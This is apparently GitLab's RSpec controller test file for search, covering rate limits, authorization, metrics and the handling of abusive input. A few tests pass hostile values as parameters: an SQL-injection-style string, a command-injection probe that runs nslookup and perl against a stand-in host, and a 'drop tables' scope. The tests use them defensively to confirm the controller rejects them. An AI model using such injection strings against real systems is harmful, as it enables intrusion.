# frozen_string_literal: true

require 'spec_helper'

RSpec.describe SearchController, feature_category: :global_search do
  include ExternalAuthorizationServiceHelpers

  context 'authorized user' do
    let(:user) { create(:user) }

    before do
      sign_in(user)
    end

    shared_examples_for 'support for active record query timeouts' do |action, params, method_to_stub, format|
      before do
        allow_next_instance_of(SearchService) do |service|
          allow(service).to receive(method_to_stub).and_raise(ActiveRecord::QueryCanceled)
        end
      end

      it 'renders a 408 when a timeout occurs' do
        get action, params: params, format: format

        expect(response).to have_gitlab_http_status(:request_timeout)
      end
    end

    shared_examples_for 'metadata is set' do |action|
      it 'sets the metadata' do
        expect(controller).to receive(:append_info_to_payload).and_wrap_original do |method, payload|
          method.call(payload)

          expect(payload[:metadata]['meta.search.group_id']).to eq('123')
          expect(payload[:metadata]['meta.search.project_id']).to eq('456')
          expect(payload[:metadata]).not_to have_key('meta.search.search')
          expect(payload[:metadata]['meta.search.scope']).to eq('issues')
          expect(payload[:metadata]['meta.search.force_search_results']).to eq('true')
          expect(payload[:metadata]['meta.search.filters.confidential']).to eq('true')
          expect(payload[:metadata]['meta.search.filters.state']).to eq('true')
          expect(payload[:metadata]['meta.search.project_ids']).to eq(%w[456 789])
          expect(payload[:metadata]['meta.search.type']).to eq('basic')
          expect(payload[:metadata]['meta.search.level']).to eq('global')
          expect(payload[:metadata]['meta.search.filters.language']).to eq(['ruby'])
          expect(payload[:metadata]['meta.search.page']).to eq('2')
          expect(payload[:metadata][:global_search_duration_s]).to be_a_kind_of(Numeric)
        end
        params = {
          scope: 'issues', search: 'hello world', group_id: '123', page: '2', project_id: '456', language: ['ruby'],
          project_ids: %w[456 789], confidential: true, include_archived: true, state: true, force_search_results: true
        }
        get action, params: params
      end
    end

    describe 'GET #show', :snowplow do
      it_behaves_like 'when the user cannot read cross project', :show, { search: 'hello' } do
        it 'still allows accessing the search page' do
          get :show

          expect(response).to have_gitlab_http_status(:ok)
        end
      end

      it_behaves_like 'internal event tracking' do
        let(:params) { { search: 'foobar' } }
        let(:event) { 'perform_search' }
        let(:category) { described_class.to_s }
        let(:namespace) { nil }
        let(:project) { nil }

        subject(:tracked_event) { get :show, params: params }
      end

      context 'for navbar search' do
        let(:params) { { search: 'foobar', nav_source: 'navbar' } }
        let(:category) { described_class.to_s }
        let(:namespace) { nil }
        let(:project) { nil }

        it_behaves_like 'internal event tracking' do
          let(:event) { 'perform_navbar_search' }

          subject(:tracked_event) { get :show, params: params }
        end
      end

      it_behaves_like 'with external authorization service enabled', :show, { search: 'hello' }
      it_behaves_like 'support for active record query timeouts', :show, { search: 'hello' }, :search_objects, :html
      it_behaves_like 'metadata is set', :show

      it 'verifies search type' do
        expect_next_instance_of(SearchService) do |service|
          expect(service).to receive(:search_type_errors).once
        end

        get :show, params: { search: 'hello', scope: 'blobs' }
      end

      describe 'rate limit scope' do
        it 'uses current_user and search scope' do
          %w[projects blobs users issues merge_requests].each do |scope|
            expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
              scope: [user, scope], users_allowlist: [])
            get :show, params: { search: 'hello', scope: scope }
          end
        end

        it 'uses just current_user when no search scope is used' do
          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get :show, params: { search: 'hello' }
        end

        it 'uses just current_user when search scope is abusive' do
          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get(:show, params: { search: 'hello', scope: 'hack-the-mainframe' })

          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get :show, params: { search: 'hello', scope: 'blobs' * 1000 }
        end
      end

      context 'uses the right partials depending on scope' do
        using RSpec::Parameterized::TableSyntax
        render_views

        let_it_be(:project) { create(:project, :public, :repository, :wiki_repo) }

        before do
          expect(::Gitlab::GitalyClient).to receive(:allow_ref_name_caching).and_call_original
        end

        subject { get(:show, params: { project_id: project.id, scope: scope, search: 'merge' }) }

        where(:partial, :scope) do
          '_blob'        | :blobs
          '_wiki_blob'   | :wiki_blobs
          '_commit'      | :commits
        end

        with_them do
          it do
            project_wiki = create(:project_wiki, project: project, user: user)
            create(:wiki_page, wiki: project_wiki, title: 'merge', content: 'merge')

            expect(subject).to render_template("search/results/#{partial}")
          end
        end
      end

      context 'global search' do
        using RSpec::Parameterized::TableSyntax
        render_views

        context 'when block_anonymous_global_searches is disabled' do
          before do
            stub_feature_flags(block_anonymous_global_searches: false)
          end

          it 'omits pipeline status from load' do
            project = create(:project, :public)
            expect(Gitlab::Cache::Ci::ProjectPipelineStatus).not_to receive(:load_in_batch_for_projects)

            get :show, params: { scope: 'projects', search: project.name }

            expect(assigns[:search_objects].first).to eq project
          end

          context 'check search term length' do
            let(:search_queries) do
              char_limit = Gitlab::Search::Params::SEARCH_CHAR_LIMIT
              term_limit = Gitlab::Search::Params::SEARCH_TERM_LIMIT
              term_char_limit = Gitlab::Search::AbuseDetection::ABUSIVE_TERM_SIZE
              {
                chars_under_limit: ((('a' * (term_char_limit - 1)) + ' ') * (term_limit - 1))[0, char_limit],
                chars_over_limit: ((('a' * (term_char_limit - 1)) + ' ') * (term_limit - 1))[0, char_limit + 1],
                terms_under_limit: ('abc ' * (term_limit - 1)),
                terms_over_limit: ('abc ' * (term_limit + 1)),
                term_length_over_limit: ('a' * (term_char_limit + 1)),
                term_length_under_limit: ('a' * (term_char_limit - 1)),
                blank: ''
              }
            end

            where(:string_name, :expectation) do
              :chars_under_limit       | :not_to_set_flash
              :chars_over_limit        | :set_chars_flash
              :terms_under_limit       | :not_to_set_flash
              :terms_over_limit        | :set_terms_flash
              :term_length_under_limit | :not_to_set_flash
              :term_length_over_limit  | :not_to_set_flash # abuse, so do nothing.
              :blank                   | :not_to_set_flash
            end

            with_them do
              it do
                get :show, params: { scope: 'projects', search: search_queries[string_name] }

                case expectation
                when :not_to_set_flash
                  expect(controller).not_to set_flash[:alert]
                when :set_chars_flash
                  expect(controller).to set_flash[:alert].to(/characters/)
                when :set_terms_flash
                  expect(controller).to set_flash[:alert].to(/terms/)
                end
              end
            end
          end
        end

        context 'when block_anonymous_global_searches is enabled' do
          context 'for unauthenticated user' do
            before do
              sign_out(user)
            end

            it 'redirects to login page' do
              get :show, params: { scope: 'projects', search: '*' }

              expect(response).to redirect_to new_user_session_path
            end

            it 'redirects to login page when trying to circumvent the restriction' do
              get :show, params: { scope: 'projects', project_id: non_existing_record_id, search: '*' }

              expect(response).to redirect_to new_user_session_path
            end
          end

          context 'for authenticated user' do
            it 'succeeds' do
              get :show, params: { scope: 'projects', search: '*' }

              expect(response).to have_gitlab_http_status(:ok)
            end
          end

          context 'handling abusive search_terms' do
            it 'succeeds but does NOT do anything' do
              get :show, params: { scope: 'projects', search: '*', repository_ref: '-1%20OR%203%2B640-640-1=0%2B0%2B0%2B1' }
              expect(response).to have_gitlab_http_status(:ok)
              expect(assigns(:search_results)).to be_a ::Search::EmptySearchResults
            end
          end
        end

        context 'when allow_anonymous_searches is disabled' do
          before do
            stub_feature_flags(allow_anonymous_searches: false)
          end

          context 'for unauthenticated user' do
            before do
              sign_out(user)
            end

            it 'redirects to login page' do
              get :show, params: { scope: 'projects', search: '*' }

              expect(response).to redirect_to new_user_session_path
              expect(flash[:alert]).to match(/You need to sign in or sign up before continuing/)
            end
          end
        end

        context 'for tab feature flags' do
          subject(:show) { get :show, params: { scope: scope, search: 'term' }, format: :html }

          where(:admin_setting, :scope) do
            :global_search_issues_enabled         | 'issues'
            :global_search_merge_requests_enabled | 'merge_requests'
            :global_search_users_enabled          | 'users'
          end

          with_them do
            it 'returns 200 if flag is enabled' do
              stub_application_setting(admin_setting => true)

              show

              expect(response).to have_gitlab_http_status(:ok)
            end

            it 'redirects with alert if flag is disabled' do
              stub_application_setting(admin_setting => false)

              show

              expect(response).to redirect_to search_path
              expect(controller).to set_flash[:alert].to(/Global Search is disabled for this scope/)
            end
          end
        end
      end

      it 'finds issue comments' do
        project = create(:project, :public)
        note = create(:note_on_issue, project: project)

        get :show, params: { project_id: project.id, scope: 'notes', search: note.note }

        expect(assigns[:search_objects].first).to eq note
      end

      context 'unique users tracking' do
        before do
          allow(Gitlab::UsageDataCounters::HLLRedisCounter).to receive(:track_event)
        end

        it_behaves_like 'tracking unique hll events' do
          subject(:request) { get :show, params: { scope: 'projects', search: 'term' } }

          let(:target_event) { 'i_search_total' }
          let(:expected_value) { instance_of(String) }
        end
      end

      it_behaves_like 'Snowplow event tracking with RedisHLL context' do
        subject { get :show, params: { group_id: namespace.id, scope: 'blobs', search: 'term' } }

        let(:project) { nil }
        let(:category) { described_class.to_s }
        let(:action) { 'executed' }
        let(:label) { 'redis_hll_counters.search.search_total_unique_counts_monthly' }
        let(:property) { 'i_search_total' }
        let(:context) do
          [Gitlab::Tracking::ServicePingContext.new(data_source: :redis_hll, event: property).to_context]
        end

        let(:namespace) { create(:group) }
      end

      context 'on restricted projects' do
        context 'when signed out' do
          before do
            sign_out(user)
          end

          it "doesn't expose comments on issues" do
            project = create(:project, :public, :issues_private)
            note = create(:note_on_issue, project: project)

            get :show, params: { project_id: project.id, scope: 'notes', search: note.note }

            expect(assigns[:search_objects].count).to eq(0)
          end
        end

        it "doesn't expose comments on merge_requests" do
          project = create(:project, :public, :merge_requests_private)
          note = create(:note_on_merge_request, project: project)

          get :show, params: { project_id: project.id, scope: 'notes', search: note.note }

          expect(assigns[:search_objects].count).to eq(0)
        end

        it "doesn't expose comments on snippets" do
          project = create(:project, :public, :snippets_private)
          note = create(:note_on_project_snippet, project: project)

          get :show, params: { project_id: project.id, scope: 'notes', search: note.note }

          expect(assigns[:search_objects].count).to eq(0)
        end
      end

      it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit do
        let(:current_user) { user }

        def request
          get(:show, params: { search: 'foo@bar.com', scope: 'users' })
        end
      end

      it_behaves_like 'search request exceeding rate limit', :clean_gitlab_redis_cache do
        let(:current_user) { user }

        def request
          get(:show, params: { search: 'foo@bar.com', scope: 'users' })
        end
      end

      it 'increments the custom search sli apdex' do
        expect(Gitlab::Metrics::GlobalSearchSlis).to receive(:record_apdex).with(
          elapsed: a_kind_of(Numeric),
          search_scope: 'issues',
          search_type: 'basic',
          search_level: 'global'
        )

        get :show, params: { scope: 'issues', search: 'hello world' }
      end

      context 'custom search sli error rate' do
        context 'when the search is successful' do
          it 'increments the custom search sli error rate with error: false' do
            expect(Gitlab::Metrics::GlobalSearchSlis).to receive(:record_error_rate).with(
              error: false,
              search_scope: 'issues',
              search_type: 'basic',
              search_level: 'global'
            )

            get :show, params: { scope: 'issues', search: 'hello world' }
          end
        end

        context 'when the search raises an error' do
          before do
            allow_next_instance_of(SearchService) do |service|
              allow(service).to receive(:search_results).and_raise(ActiveRecord::QueryCanceled)
            end
          end

          it 'increments the custom search sli error rate with error: true' do
            expect(Gitlab::Metrics::GlobalSearchSlis).to receive(:record_error_rate).with(
              error: true,
              search_scope: 'issues',
              search_type: 'basic',
              search_level: 'global'
            )

            get :show, params: { scope: 'issues', search: 'hello world' }
          end
        end

        context 'when something goes wrong before a search is done' do
          it 'does not increment the error rate' do
            expect(Gitlab::Metrics::GlobalSearchSlis).not_to receive(:record_error_rate)

            get :show, params: { scope: 'issues' } # no search query
          end
        end
      end
    end

    describe 'GET #count', :aggregate_failures do
      it_behaves_like 'when the user cannot read cross project', :count, { search: 'hello', scope: 'projects' }
      it_behaves_like 'with external authorization service enabled', :count, { search: 'hello', scope: 'projects' }
      it_behaves_like 'support for active record query timeouts', :count, { search: 'hello', scope: 'projects' }, :search_results, :json
      it_behaves_like 'metadata is set', :count

      it 'returns the result count for the given term and scope' do
        create(:project, :public, name: 'hello world')
        create(:project, :public, name: 'foo bar')

        get :count, params: { search: 'hello', scope: 'projects' }

        expect(response).to have_gitlab_http_status(:ok)
        expect(json_response).to eq({ 'count' => '1' })
      end

      describe 'rate limit scope' do
        it 'uses current_user and search scope' do
          %w[projects blobs users issues merge_requests].each do |scope|
            expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
              scope: [user, scope], users_allowlist: [])
            get :count, params: { search: 'hello', scope: scope }
          end
        end

        it 'uses just current_user when search scope is abusive' do
          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get :count, params: { search: 'hello', scope: 'hack-the-mainframe' }

          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get :count, params: { search: 'hello', scope: 'blobs' * 1000 }
        end
      end

      it 'raises an error if search term is missing' do
        expect do
          get :count, params: { scope: 'projects' }
        end.to raise_error(ActionController::ParameterMissing)
      end

      it 'raises an error if search scope is missing' do
        expect do
          get :count, params: { search: 'hello' }
        end.to raise_error(ActionController::ParameterMissing)
      end

      it 'sets correct cache control headers' do
        get :count, params: { search: 'hello', scope: 'projects' }

        expect(response).to have_gitlab_http_status(:ok)

        expect(response.headers['Cache-Control']).to eq('max-age=60, private')
        expect(response.headers['Pragma']).to be_nil
      end

      it 'does NOT blow up if search param is NOT a string' do
        get :count, params: { search: ['hello'], scope: 'projects' }
        expect(response).to have_gitlab_http_status(:ok)
        expect(json_response).to eq({ 'count' => '0' })

        get :count, params: { search: { nested: 'hello' }, scope: 'projects' }
        expect(response).to have_gitlab_http_status(:ok)
        expect(json_response).to eq({ 'count' => '0' })
      end

      it 'does NOT blow up if repository_ref contains abusive characters' do
        get :count, params: {
          search: 'hello',
          repository_ref: "(nslookup%20hitqlwv501f.somewhere.bad%7C%7Cperl%20-e%20%22gethostbyname('hitqlwv501f.somewhere.bad')%22)",
          scope: 'projects'
        }
        expect(response).to have_gitlab_http_status(:ok)
        expect(json_response).to eq({ 'count' => '0' })
      end

      describe 'database transaction' do
        before do
          allow_next_instance_of(SearchService) do |search_service|
            allow(search_service).to receive(:search_type).and_return(search_type)
          end
        end

        subject(:count) { get :count, params: { search: 'hello', scope: 'projects' } }

        context 'for basic search' do
          let(:search_type) { 'basic' }

          it 'executes within transaction with short timeout' do
            expect(ApplicationRecord).to receive(:with_fast_read_statement_timeout)

            count
          end
        end

        context 'for advacned search' do
          let(:search_type) { 'advanced' }

          it 'does not execute within transaction' do
            expect(ApplicationRecord).not_to receive(:with_fast_read_statement_timeout)

            count
          end
        end
      end

      it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit do
        let(:current_user) { user }

        def request
          get(:count, params: { search: 'foo@bar.com', scope: 'users' })
        end
      end

      it_behaves_like 'search request exceeding rate limit', :clean_gitlab_redis_cache do
        let(:current_user) { user }

        def request
          get(:count, params: { search: 'foo@bar.com', scope: 'users' })
        end
      end
    end

    describe 'GET #autocomplete' do
      it_behaves_like 'when the user cannot read cross project', :autocomplete, { term: 'hello' }
      it_behaves_like 'with external authorization service enabled', :autocomplete, { term: 'hello' }
      it_behaves_like 'support for active record query timeouts', :autocomplete, { term: 'hello' }, :project, :json

      it 'raises an error if search term is missing' do
        expect do
          get :autocomplete
        end.to raise_error(ActionController::ParameterMissing)
      end

      it 'returns an empty array when given abusive search term' do
        get :autocomplete, params: { term: ('hal' * 4000), scope: 'projects' }
        expect(response).to have_gitlab_http_status(:ok)
        expect(json_response).to be_empty
      end

      describe 'rate limit scope' do
        it 'uses current_user and search scope' do
          %w[projects blobs users issues merge_requests].each do |scope|
            expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
              scope: [user, scope], users_allowlist: [])
            get :autocomplete, params: { term: 'hello', scope: scope }
          end
        end

        it 'uses just current_user when search scope is abusive' do
          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get :autocomplete, params: { term: 'hello', scope: 'hack-the-mainframe' }

          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit,
            scope: [user], users_allowlist: [])
          get :autocomplete, params: { term: 'hello', scope: 'blobs' * 1000 }
        end
      end

      it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit do
        let(:current_user) { user }

        def request
          get(:autocomplete, params: { term: 'foo@bar.com', scope: 'users' })
        end
      end

      it_behaves_like 'search request exceeding rate limit', :clean_gitlab_redis_cache do
        let(:current_user) { user }

        def request
          get(:autocomplete, params: { term: 'foo@bar.com', scope: 'users' })
        end
      end

      it 'can be filtered with params[:filter]' do
        get :autocomplete, params: { term: 'setting', filter: 'generic' }
        expect(response).to have_gitlab_http_status(:ok)
        expect(json_response.count).to eq(1)
        expect(json_response.first['label']).to match(/User settings/)
      end

      it 'can be scoped with params[:scope]' do
        expect(controller).to receive(:search_autocomplete_opts).with('setting', filter: nil, scope: 'project')

        get :autocomplete, params: { term: 'setting', scope: 'project' }
      end

      it 'makes a call to search_autocomplete_opts' do
        expect(controller).to receive(:search_autocomplete_opts).once

        get :autocomplete, params: { term: 'setting', filter: 'generic' }
      end

      it 'sets correct cache control headers' do
        get :autocomplete, params: { term: 'setting', filter: 'generic' }

        expect(response).to have_gitlab_http_status(:ok)

        expect(response.headers['Cache-Control']).to eq('max-age=60, private')
        expect(response.headers['Pragma']).to be_nil
      end

      context 'unique users tracking' do
        before do
          allow(Gitlab::UsageDataCounters::HLLRedisCounter).to receive(:track_event)
        end

        it_behaves_like 'tracking unique hll events' do
          subject(:request) { get :autocomplete, params: { term: 'term' } }

          let(:target_event) { 'i_search_total' }
          let(:expected_value) { instance_of(String) }
        end
      end

      it_behaves_like 'Snowplow event tracking with RedisHLL context' do
        subject { get :autocomplete, params: { group_id: namespace.id, term: 'term' } }

        let(:project) { nil }
        let(:category) { described_class.to_s }
        let(:action) { 'autocomplete' }
        let(:label) { 'redis_hll_counters.search.search_total_unique_counts_monthly' }
        let(:property) { 'i_search_total' }
        let(:context) do
          [Gitlab::Tracking::ServicePingContext.new(data_source: :redis_hll, event: property).to_context]
        end

        let(:namespace) { create(:group) }
      end
    end

    describe '#append_info_to_payload' do
      it 'appends search metadata for logging' do
        expect(controller).to receive(:append_info_to_payload).and_wrap_original do |method, payload|
          method.call(payload)

          expect(payload[:metadata]['meta.search.group_id']).to eq('123')
          expect(payload[:metadata]['meta.search.project_id']).to eq('456')
          expect(payload[:metadata]).not_to have_key('meta.search.search')
          expect(payload[:metadata]['meta.search.scope']).to eq('issues')
          expect(payload[:metadata]['meta.search.force_search_results']).to eq('true')
          expect(payload[:metadata]['meta.search.filters.confidential']).to eq('true')
          expect(payload[:metadata]['meta.search.filters.state']).to eq('true')
          expect(payload[:metadata]['meta.search.project_ids']).to eq(%w[456 789])
          expect(payload[:metadata]['meta.search.type']).to eq('basic')
          expect(payload[:metadata]['meta.search.level']).to eq('global')
          expect(payload[:metadata]['meta.search.filters.language']).to eq(['ruby'])
          expect(payload[:metadata]['meta.search.page']).to eq('2')
        end

        get :show, params: {
          scope: 'issues',
          search: 'hello world',
          group_id: '123',
          page: '2',
          project_id: '456',
          project_ids: %w[456 789],
          confidential: true,
          include_archived: true,
          state: true,
          force_search_results: true,
          language: ['ruby']
        }
      end

      it 'appends the default scope in meta.search.scope' do
        expect(controller).to receive(:append_info_to_payload).and_wrap_original do |method, payload|
          method.call(payload)

          expect(payload[:metadata]['meta.search.scope']).to eq('projects')
        end

        get :show, params: { search: 'hello world', group_id: '123', project_id: '456' }
      end

      it 'appends the search time based on the search' do
        expect(controller).to receive(:append_info_to_payload).and_wrap_original do |method, payload|
          method.call(payload)

          expect(payload[:metadata][:global_search_duration_s]).to be_a_kind_of(Numeric)
        end

        get :show, params: { search: 'hello world', group_id: '123', project_id: '456' }
      end
    end

    context 'abusive searches', :aggregate_failures do
      let(:project) { create(:project, :public, name: 'hello world') }
      let(:make_abusive_request) do
        get :show, params: { scope: '1;drop%20tables;boom', search: 'hello world', project_id: project.id }
      end

      before do
        enable_external_authorization_service_check
      end

      it 'returns EmptySearchResults' do
        expect(::Search::EmptySearchResults).to receive(:new).and_call_original
        make_abusive_request
        expect(response).to have_gitlab_http_status(:ok)
      end
    end
  end

  context 'unauthorized user' do
    describe 'redirecting' do
      using RSpec::Parameterized::TableSyntax

      where(:restricted_visibility_levels, :allow_anonymous_searches, :block_anonymous_global_searches, :redirect) do
        [Gitlab::VisibilityLevel::PUBLIC]   | true  | false | true
        [Gitlab::VisibilityLevel::PRIVATE]  | true  | false | false
        nil                                 | true  | false | false
        nil                                 | false | false | true
        nil                                 | true  | true  | true
        nil                                 | false | true  | true
      end

      with_them do
        before do
          stub_application_setting(restricted_visibility_levels: restricted_visibility_levels)
          stub_feature_flags(allow_anonymous_searches: allow_anonymous_searches)
          stub_feature_flags(block_anonymous_global_searches: block_anonymous_global_searches)
        end

        it 'redirects to the sign in/sign up page when it should' do
          get :show, params: { search: 'hello', scope: 'projects' }

          if redirect
            expect(response).to redirect_to(new_user_session_path)
          else
            expect(response).not_to redirect_to(new_user_session_path)
          end
        end

        it 'does not redirect for the opensearch endpoint' do
          get :opensearch

          expect(response).not_to redirect_to(new_user_session_path)
        end
      end
    end

    describe 'search rate limits' do
      using RSpec::Parameterized::TableSyntax

      let(:project) { create(:project, :public) }

      where(:endpoint, :params) do
        :show         | { search: 'hello', scope: 'projects' }
        :count        | { search: 'hello', scope: 'projects' }
        :autocomplete | { term: 'hello', scope: 'projects' }
      end

      with_them do
        it_behaves_like 'rate limited endpoint', rate_limit_key: :search_rate_limit_unauthenticated do
          def request
            get endpoint, params: params.merge(project_id: project.id)
          end
        end

        it 'uses request IP as rate limiting scope' do
          expect(::Gitlab::ApplicationRateLimiter).to receive(:throttled?).with(:search_rate_limit_unauthenticated, scope: [request.ip])
          get endpoint, params: params.merge(project_id: project.id)
        end
      end
    end

    describe 'GET #opensearch' do
      render_views

      it 'renders xml' do
        get :opensearch, format: :xml

        doc = Nokogiri::XML.parse(response.body)

        expect(response).to have_gitlab_http_status(:ok)
        expect(doc.css('OpenSearchDescription ShortName').text).to eq('GitLab')
        expect(doc.css('OpenSearchDescription *').map(&:name)).to eq(%w[ShortName Description InputEncoding Image Url SearchForm])
      end
    end
  end

  context 'when CE edition', unless: Gitlab.ee? do
    describe '#multi_match?' do
      using RSpec::Parameterized::TableSyntax

      where(:search_type, :scope) do
        'basic'    | 'blobs'
        'advanced' | 'blobs'
        'zoekt'    | 'blobs'
        'basic'    | 'issues'
        'advanced' | 'issues'
        'zoekt'    | 'issues'
      end

      with_them do
        it 'returns false' do
          result = subject.send(:multi_match?, search_type: search_type, scope: scope)
          expect(result).to be(false)
        end
      end
    end
  end
end
